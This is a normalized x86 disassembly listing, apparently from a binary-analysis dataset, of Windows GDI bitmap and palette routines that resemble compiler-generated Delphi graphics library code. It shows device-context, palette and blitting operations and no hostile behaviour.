lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422a94
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423718
call sub_422a94
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4241b8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e8b
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_427e5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424260
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4027d4
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422a94
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423718
call sub_422a94
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422a94
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423718
call sub_422a94
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424260
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a84
call sub_403a84
jmp r-xdata
sub_427ead
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427ebc
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a00
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427f1c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_427f80
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_427474
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42817b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424260
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428133
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4278b8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42818c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4253e0
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4276e4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4281f4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_428904
mov eax [ esi + 0x28 ]
call sub_4276e8
mov eax [ esi + 0x2c ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_428230
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4282e8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c58
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428b74
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_4276e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4276e8
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a7dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_428320
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428904
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4283af
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_427f1c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4278b8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428b74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4283b4
mov eax [ ebp - 0x8 ]
call sub_4221c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a00
call sub_403a54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4283e0
push ebx
mov ebx eax
mov eax ebx
call sub_4286d4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d420
pop ebx
retn
sub_428410
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41befc
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_428904
lea eax [ ebx + 0x2c ]
call sub_40d420
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428b74
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_428484
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_423f3c
mov eax ebx
call sub_428a14
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_428810
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4286c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_423e68
push eax
call SetStretchBltMode
mov eax ebx
call sub_428754
mov dl [ r-xdata ]
call sub_423f3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4289b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_428754
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286c7
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_428655
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_428754
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4286d4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_428914
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_428320
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4241b8
sub_428754
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_428914
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4274f0
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_4283e0
sub_42879c
push ebx
mov ebx eax
mov eax ebx
call sub_428904
mov eax ebx
call sub_428914
mov edx ebx
mov eax ebx
call sub_4283e0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4287c0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_428840
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_422a94
mov eax ebx
call sub_428810
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_428754
xor edx edx
pop ecx
call sub_423df4
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_428890
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_428a14
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4278b8
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_428914
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41be98
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_428997
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4289b4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_428904
mov eax ebx
call sub_428914
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_428840
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_427f80
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_427474
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_428a14
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_424950
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_427474
push 0x0
call GetDC
call sub_424260
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_428acc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424128
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_428320
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_428904
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c58
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428b50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41be78
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_429204
pop esi
pop ebx
retn
sub_428b74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428bfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_428c5b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4276e8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_4276e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c62
push rw-data
call LeaveCriticalSection
retn
sub_428c74
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
